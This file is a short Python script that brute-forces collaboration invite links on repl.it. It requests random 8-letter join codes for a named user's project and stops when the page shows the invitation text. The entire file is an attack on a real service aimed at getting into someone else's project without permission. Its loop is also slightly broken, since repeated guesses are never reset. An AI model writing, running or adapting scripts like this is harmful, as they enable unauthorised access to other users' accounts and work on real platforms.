import sys
import requests
import random

count = 0
characters = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u',
              'v', 'w', 'x', 'y', 'z']
passAttempt = ""
wrongPasses = []

for i in range(0, 10000000):
    for k in range(0, 8):
        passAttempt = passAttempt + random.choice(characters)
    print('Attempting ' + str(passAttempt) + '...')
    if passAttempt in wrongPasses:
        continue
    r = requests.get('https://repl.it/login?goto=/join/' + passAttempt + '-macnoah9')
    if "Invitation to collaborate on kjhrtyeg" in r.text:
        correctPass = passAttempt
        print("The pass is " + correctPass)
        break
    else:
        wrongPasses.append(passAttempt)
    passAttempt = ''


#kjhrtyeg